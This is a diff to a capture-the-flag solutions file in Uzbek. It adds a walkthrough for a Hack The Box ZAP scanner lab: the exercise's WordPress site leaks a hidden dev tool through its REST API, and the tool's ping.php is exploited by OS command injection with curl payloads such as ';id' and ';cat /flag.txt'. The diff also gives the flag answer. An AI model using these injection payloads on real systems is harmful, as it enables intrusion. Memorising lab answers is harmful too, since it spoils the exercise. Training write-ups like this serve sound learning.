@@ -1,4 +1,41 @@
-# CTF yechimlari (target: `154.57.164.70:37327`)
+# CTF yechimlari (targetlar)
+
+## Target 2 — `154.57.164.81:38220` (ZAP Scanner mashqi)
+
+| Savol | Javob |
+|-------|-------|
+| Question 1 (`/flag.txt` bayrog'i) | `HTB{5c4nn3r5_f1nd_vuln5_w3_m155}` |
+
+Sayt — **WordPress 5.8** (Apache 2.4.41, Ubuntu) va unda directory listing yoqilgan
+(`/wp-includes/`, `/wp-content/uploads/2026/10/`, `/devtools/`). ZAP spider/forced-browse
+hamda javoblardagi izohlar orqali zanjir quyidagicha topiladi:
+
+1. WordPress REST API orqali post va izohni o'qish:
+   ```bash
+   curl -s "$B/index.php/wp-json/wp/v2/comments"
+   ```
+   "Customer Support" postidagi tasdiqlangan izoh yashirin dev-tool manzilini oshkor qiladi:
+   `/devtools/ping.php?ip=127.0.0.1`.
+
+2. `/devtools/` katalogida faqat `ping.php` bor. `ip` parametri shell'ga to'g'ridan-to'g'ri
+   uzatiladi — bu **OS Command Injection** (ZAP buni "High" risk sifatida belgilaydi):
+   ```bash
+   curl -s "$B/devtools/ping.php?ip=127.0.0.1;id"
+   # ... uid=33(www-data) gid=33(www-data) groups=33(www-data)
+   ```
+
+3. Zaiflikdan bayroqni o'qish uchun foydalanamiz:
+   ```bash
+   curl -s "$B/devtools/ping.php?ip=127.0.0.1;cat%20/flag.txt"
+   # HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
+   ```
+
+Avtomatik tekshirish: `bash solutions/solve_zap_scanner.sh [BASE_URL]`
+
+---
+
+## Target 1 — `154.57.164.70:37327` (Burp/ZAP mashqi)
+
 
 Ikkala savolning javobi quyidagicha topildi (qayta tekshirilgan va takrorlanuvchi):
 
